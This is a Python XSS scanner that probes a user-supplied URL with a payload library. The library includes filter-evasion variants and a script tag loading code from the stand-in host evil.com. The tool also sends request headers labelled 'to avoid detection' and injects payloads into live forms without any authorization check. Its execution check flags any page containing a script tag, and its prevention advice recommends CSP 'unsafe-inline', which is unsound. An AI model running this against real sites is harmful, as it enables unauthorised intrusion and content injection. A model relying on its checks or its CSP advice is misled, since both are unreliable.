import requests
import re
import time
import threading
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import random
import json
from datetime import datetime

# ANSI color codes for professional output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

class XSSPayloadLibrary:
    """Professional XSS payload library with advanced evasion techniques"""
    
    def __init__(self):
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror='alert(\"XSS\")'>"
        ]
        
        self.advanced_payloads = [
            "javascript:alert('XSS')",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert`XSS`</script>",
            "<script>(alert)('XSS')</script>",
            "<script>setTimeout('alert(\"XSS\")',1)</script>",
            "<script>eval('alert(\"XSS\")')</script>"
        ]
        
        self.waf_bypass_payloads = [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script/**/src=//evil.com></script>",
            "<script>/**/alert('XSS')/**/</script>",
            "<img/src=x/onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe/src=javascript:alert('XSS')>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            "<script>alert('XSS')</script><script>",
            "<scr<script>ipt>alert('XSS')</script>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E"
        ]
        
        self.dom_payloads = [
            "#<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "#jaVasCript:alert('XSS')",
            "#javascript:/**/alert('XSS')",
            "#{alert('XSS')}",
            "#eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"
        ]
        
        self.context_specific_payloads = {
            'html': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            'attribute': [
                "\" onmouseover=\"alert('XSS')",
                "' onfocus='alert('XSS')",
                "javascript:alert('XSS')"
            ],
            'javascript': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "alert('XSS')//"
            ],
            'css': [
                "expression(alert('XSS'))",
                "url(javascript:alert('XSS'))",
                "behavior:url(#default#clientcaps)"
            ]
        }
    
    def get_all_payloads(self):
        """Return all payloads for comprehensive testing"""
        all_payloads = []
        all_payloads.extend(self.basic_payloads)
        all_payloads.extend(self.advanced_payloads)
        all_payloads.extend(self.waf_bypass_payloads)
        all_payloads.extend(self.dom_payloads)
        return all_payloads
    
    def get_context_payloads(self, context):
        """Get payloads specific to injection context"""
        return self.context_specific_payloads.get(context, self.basic_payloads)

class XSSVulnerabilityScanner:
    """Professional XSS vulnerability scanner"""
    
    def __init__(self, target_url, delay=1, threads=5, timeout=10):
        self.target_url = target_url
        self.delay = delay
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.payload_library = XSSPayloadLibrary()
        self.vulnerabilities = []
        self.tested_params = 0
        self.total_requests = 0
        self.start_time = None
        
        # Professional headers to avoid detection
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def discover_forms(self, url):
        """Discover forms for XSS testing"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': urljoin(url, form.get('action', '')),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name'),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if input_data['name']:
                        form_data['inputs'].append(input_data)
                
                if form_data['inputs']:
                    forms.append(form_data)
            
            return forms
            
        except Exception as e:
            return []
    
    def discover_url_parameters(self, url):
        """Discover URL parameters for testing"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return list(params.keys())
    
    def test_reflected_xss(self, url, param, method='GET'):
        """Test for reflected XSS vulnerability"""
        vulnerabilities = []
        payloads = self.payload_library.get_all_payloads()
        
        for payload in payloads:
            try:
                if method.upper() == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    data = {param: payload}
                    response = self.session.post(url, data=data, timeout=self.timeout)
                
                self.total_requests += 1
                
                # Check if payload is reflected in response
                if payload in response.text:
                    # Additional checks for actual execution
                    if self.verify_xss_execution(response.text, payload):
                        vulnerability = {
                            'type': 'Reflected XSS',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': method,
                            'severity': 'HIGH',
                            'description': f'Reflected XSS vulnerability found in parameter "{param}"'
                        }
                        vulnerabilities.append(vulnerability)
                        break  # One confirmed vuln per parameter is enough
                
                time.sleep(self.delay)
                
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def test_stored_xss(self, form_data):
        """Test for stored XSS vulnerability"""
        vulnerabilities = []
        payloads = self.payload_library.basic_payloads[:5]  # Limit for stored testing
        
        for payload in payloads:
            try:
                # Prepare form data with XSS payload
                data = {}
                for input_field in form_data['inputs']:
                    if input_field['type'] in ['text', 'email', 'search', 'textarea']:
                        data[input_field['name']] = payload
                    else:
                        data[input_field['name']] = input_field['value']
                
                # Submit form
                if form_data['method'] == 'post':
                    response = self.session.post(form_data['action'], data=data, timeout=self.timeout)
                else:
                    response = self.session.get(form_data['action'], params=data, timeout=self.timeout)
                
                self.total_requests += 1
                
                # Check for immediate reflection (might be stored)
                if payload in response.text:
                    vulnerability = {
                        'type': 'Potential Stored XSS',
                        'url': form_data['action'],
                        'parameter': 'Multiple form fields',
                        'payload': payload,
                        'method': form_data['method'].upper(),
                        'severity': 'HIGH',
                        'description': 'Potential stored XSS vulnerability detected in form submission'
                    }
                    vulnerabilities.append(vulnerability)
                    break
                
                time.sleep(self.delay)
                
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def test_dom_xss(self, url):
        """Test for DOM-based XSS vulnerability"""
        vulnerabilities = []
        dom_payloads = self.payload_library.dom_payloads
        
        for payload in dom_payloads:
            try:
                test_url = f"{url}{payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                self.total_requests += 1
                
                # Look for DOM XSS indicators in JavaScript
                if self.check_dom_xss_patterns(response.text, payload):
                    vulnerability = {
                        'type': 'DOM-based XSS',
                        'url': url,
                        'parameter': 'URL fragment/hash',
                        'payload': payload,
                        'method': 'GET',
                        'severity': 'HIGH',
                        'description': 'DOM-based XSS vulnerability detected'
                    }
                    vulnerabilities.append(vulnerability)
                    break
                
                time.sleep(self.delay)
                
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def verify_xss_execution(self, response_text, payload):
        """Verify if XSS payload can actually execute"""
        # Check for dangerous patterns that indicate execution potential
        dangerous_patterns = [
            r'<script[^>]*>.*?</script>',
            r'on\w+\s*=\s*["\']?[^"\']*alert',
            r'javascript:\s*alert',
            r'expression\s*\([^)]*alert'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def check_dom_xss_patterns(self, response_text, payload):
        """Check for DOM XSS patterns in JavaScript code"""
        dom_patterns = [
            r'document\.write\s*\([^)]*location',
            r'innerHTML\s*=\s*[^;]*location',
            r'document\.URL',
            r'location\.hash',
            r'location\.search'
        ]
        
        for pattern in dom_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def comprehensive_scan(self):
        """Perform comprehensive XSS vulnerability scan"""
        self.start_time = time.time()
        print(f"\n{BOLD}{BLUE}🎯 Starting XSS Vulnerability Scan{RESET}")
        print(f"{BOLD}{BLUE}Target: {WHITE}{self.target_url}{RESET}")
        print(f"{BOLD}{BLUE}Threads: {WHITE}{self.threads}{RESET}")
        print(f"{BOLD}{BLUE}Delay: {WHITE}{self.delay}s{RESET}")
        print(f"{WHITE}{'='*60}{RESET}\n")
        
        # 1. Discover forms
        print(f"{CYAN}📋 Discovering forms and input fields...{RESET}")
        forms = self.discover_forms(self.target_url)
        print(f"{GREEN}✅ Found {len(forms)} forms{RESET}")
        
        # 2. Discover URL parameters
        print(f"{CYAN}🔍 Analyzing URL parameters...{RESET}")
        url_params = self.discover_url_parameters(self.target_url)
        print(f"{GREEN}✅ Found {len(url_params)} URL parameters{RESET}")
        
        # 3. Test Reflected XSS
        print(f"\n{YELLOW}🔥 Testing Reflected XSS vulnerabilities...{RESET}")
        for param in url_params:
            vulns = self.test_reflected_xss(self.target_url, param)
            self.vulnerabilities.extend(vulns)
            self.tested_params += 1
        
        # 4. Test form-based XSS
        print(f"{YELLOW}📝 Testing form-based XSS vulnerabilities...{RESET}")
        for form in forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'email', 'search']:
                    vulns = self.test_reflected_xss(form['action'], input_field['name'], form['method'])
                    self.vulnerabilities.extend(vulns)
                    self.tested_params += 1
        
        # 5. Test Stored XSS
        print(f"{YELLOW}💾 Testing Stored XSS vulnerabilities...{RESET}")
        for form in forms:
            vulns = self.test_stored_xss(form)
            self.vulnerabilities.extend(vulns)
        
        # 6. Test DOM-based XSS
        print(f"{YELLOW}🌐 Testing DOM-based XSS vulnerabilities...{RESET}")
        dom_vulns = self.test_dom_xss(self.target_url)
        self.vulnerabilities.extend(dom_vulns)
        
        # Generate report
        self.generate_professional_report()
    
    def generate_professional_report(self):
        """Generate professional vulnerability report"""
        elapsed_time = time.time() - self.start_time
        
        print(f"\n{BOLD}{GREEN}📊 XSS VULNERABILITY SCAN COMPLETED{RESET}")
        print(f"{WHITE}{'='*60}{RESET}")
        
        # Scan summary
        print(f"{BOLD}{BLUE}📈 Scan Summary:{RESET}")
        print(f"   {CYAN}• Target URL:{RESET} {self.target_url}")
        print(f"   {CYAN}• Parameters Tested:{RESET} {self.tested_params}")
        print(f"   {CYAN}• Total Requests:{RESET} {self.total_requests}")
        print(f"   {CYAN}• Scan Duration:{RESET} {elapsed_time:.1f} seconds")
        print(f"   {CYAN}• Vulnerabilities Found:{RESET} {len(self.vulnerabilities)}")
        
        if not self.vulnerabilities:
            print(f"\n{GREEN}✅ NO XSS VULNERABILITIES DETECTED{RESET}")
            print(f"{GREEN}   The target appears to be properly protected against XSS attacks.{RESET}")
            return
        
        # Vulnerability details
        print(f"\n{BOLD}{RED}🚨 XSS VULNERABILITIES DETECTED:{RESET}")
        print(f"{WHITE}{'='*60}{RESET}")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            severity_color = RED if vuln['severity'] == 'HIGH' else YELLOW
            print(f"\n{BOLD}{severity_color}[{i}] {vuln['type']} - {vuln['severity']} RISK{RESET}")
            print(f"{WHITE}{'─'*50}{RESET}")
            print(f"   {BLUE}URL:{RESET} {vuln['url']}")
            print(f"   {BLUE}Parameter:{RESET} {vuln['parameter']}")
            print(f"   {BLUE}Method:{RESET} {vuln['method']}")
            print(f"   {BLUE}Payload:{RESET} {vuln['payload']}")
            print(f"   {BLUE}Description:{RESET} {vuln['description']}")
        
        # Professional recommendations
        print(f"\n{BOLD}{MAGENTA}🛡️  PROFESSIONAL RECOMMENDATIONS:{RESET}")
        print(f"{WHITE}{'='*60}{RESET}")
        print(f"{YELLOW}1. Input Validation:{RESET}")
        print(f"   • Implement strict input validation on all user inputs")
        print(f"   • Use whitelist approach for allowed characters")
        print(f"{YELLOW}2. Output Encoding:{RESET}")
        print(f"   • Encode all user data before displaying in HTML context")
        print(f"   • Use context-appropriate encoding (HTML, JavaScript, CSS)")
        print(f"{YELLOW}3. Content Security Policy (CSP):{RESET}")
        print(f"   • Implement strict CSP headers")
        print(f"   • Use nonce or hash-based CSP for inline scripts")
        print(f"{YELLOW}4. Security Headers:{RESET}")
        print(f"   • X-XSS-Protection: 1; mode=block")
        print(f"   • X-Content-Type-Options: nosniff")
        print(f"{YELLOW}5. Regular Security Testing:{RESET}")
        print(f"   • Implement automated XSS testing in CI/CD pipeline")
        print(f"   • Conduct regular penetration testing")
        
        # OWASP reference
        print(f"\n{BOLD}{CYAN}📚 REFERENCES:{RESET}")
        print(f"   • OWASP XSS Prevention Cheat Sheet")
        print(f"   • OWASP Top 10 - A03:2021 Injection")
        print(f"   • CWE-79: Cross-site Scripting")
        
        print(f"\n{WHITE}{'='*60}{RESET}")
        print(f"{BOLD}{GREEN}Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")

def run():
    """Main function for XSS Vulnerability Scanner"""
    print(f"""{CYAN}
🔍 XSS Vulnerability Scanner
{'='*60}
Professional Cross-Site Scripting vulnerability detection
with advanced payload library and evasion techniques
{RESET}""")
    
    while True:
        print(f"\n{BOLD}{GREEN}===== XSS Vulnerability Scanner ====={RESET}")
        print(f"{BLUE}1.{RESET} {WHITE}Single URL Scan{RESET}")
        print(f"{BLUE}2.{RESET} {WHITE}Advanced Configuration Scan{RESET}")
        print(f"{BLUE}3.{RESET} {WHITE}Payload Library Information{RESET}")
        print(f"{BLUE}4.{RESET} {WHITE}XSS Prevention Guide{RESET}")
        print(f"{BLUE}0.{RESET} {RED}Return to Menu{RESET}")
        
        choice = input(f"\n{BOLD}{WHITE}Select scan type: {RESET}")
        
        if choice == '0':
            break
            
        elif choice == '1':
            # Single URL scan
            target_url = input(f"{YELLOW}Enter target URL: {RESET}").strip()
            
            if not target_url:
                print(f"{RED}❌ Please enter a valid URL{RESET}")
                continue
            
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
            try:
                scanner = XSSVulnerabilityScanner(target_url)
                scanner.comprehensive_scan()
                
            except KeyboardInterrupt:
                print(f"\n{YELLOW}⚠️  Scan interrupted by user{RESET}")
            except Exception as e:
                print(f"{RED}❌ Error occurred: {e}{RESET}")
        
        elif choice == '2':
            # Advanced configuration
            target_url = input(f"{YELLOW}Enter target URL: {RESET}").strip()
            
            if not target_url:
                print(f"{RED}❌ Please enter a valid URL{RESET}")
                continue
            
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
            try:
                delay = float(input(f"{YELLOW}Request delay (seconds) [1]: {RESET}") or "1")
                threads = int(input(f"{YELLOW}Number of threads [5]: {RESET}") or "5")
                timeout = int(input(f"{YELLOW}Request timeout (seconds) [10]: {RESET}") or "10")
                
                scanner = XSSVulnerabilityScanner(target_url, delay=delay, threads=threads, timeout=timeout)
                scanner.comprehensive_scan()
                
            except ValueError:
                print(f"{RED}❌ Invalid configuration values{RESET}")
            except KeyboardInterrupt:
                print(f"\n{YELLOW}⚠️  Scan interrupted by user{RESET}")
            except Exception as e:
                print(f"{RED}❌ Error occurred: {e}{RESET}")
        
        elif choice == '3':
            # Payload library info
            print(f"\n{BOLD}{CYAN}📚 XSS PAYLOAD LIBRARY INFORMATION{RESET}")
            print(f"{WHITE}{'='*50}{RESET}")
            
            payload_lib = XSSPayloadLibrary()
            print(f"{GREEN}📊 Payload Statistics:{RESET}")
            print(f"   • Basic Payloads: {len(payload_lib.basic_payloads)}")
            print(f"   • Advanced Payloads: {len(payload_lib.advanced_payloads)}")
            print(f"   • WAF Bypass Payloads: {len(payload_lib.waf_bypass_payloads)}")
            print(f"   • DOM XSS Payloads: {len(payload_lib.dom_payloads)}")
            print(f"   • Total Payloads: {len(payload_lib.get_all_payloads())}")
            
            print(f"\n{YELLOW}🔍 Sample Payloads:{RESET}")
            print(f"   • Basic: <script>alert('XSS')</script>")
            print(f"   • Image: <img src=x onerror=alert('XSS')>")
            print(f"   • SVG: <svg onload=alert('XSS')>")
            print(f"   • WAF Bypass: <ScRiPt>alert('XSS')</ScRiPt>")
            print(f"   • DOM: #<script>alert('XSS')</script>")
        
        elif choice == '4':
            # XSS prevention guide
            print(f"\n{BOLD}{CYAN}🛡️  XSS PREVENTION BEST PRACTICES{RESET}")
            print(f"{WHITE}{'='*50}{RESET}")
            
            print(f"{YELLOW}1. Input Validation:{RESET}")
            print(f"   ✅ Validate all user inputs on server-side")
            print(f"   ✅ Use whitelist approach for allowed characters")
            print(f"   ✅ Reject or sanitize potentially malicious input")
            
            print(f"\n{YELLOW}2. Output Encoding:{RESET}")
            print(f"   ✅ HTML encode: &lt;script&gt; instead of <script>")
            print(f"   ✅ JavaScript encode: \\x3Cscript\\x3E")
            print(f"   ✅ URL encode: %3Cscript%3E")
            
            print(f"\n{YELLOW}3. Content Security Policy:{RESET}")
            print(f"   ✅ default-src 'self'")
            print(f"   ✅ script-src 'self' 'unsafe-inline'")
            print(f"   ✅ object-src 'none'")
            
            print(f"\n{YELLOW}4. Security Headers:{RESET}")
            print(f"   ✅ X-XSS-Protection: 1; mode=block")
            print(f"   ✅ X-Content-Type-Options: nosniff")
            print(f"   ✅ X-Frame-Options: DENY")
        
        else:
            print(f"{RED}❌ Invalid selection!{RESET}")
            
        input(f"\n{BOLD}{CYAN}Press Enter to continue...{RESET}")

if __name__ == "__main__":
    run()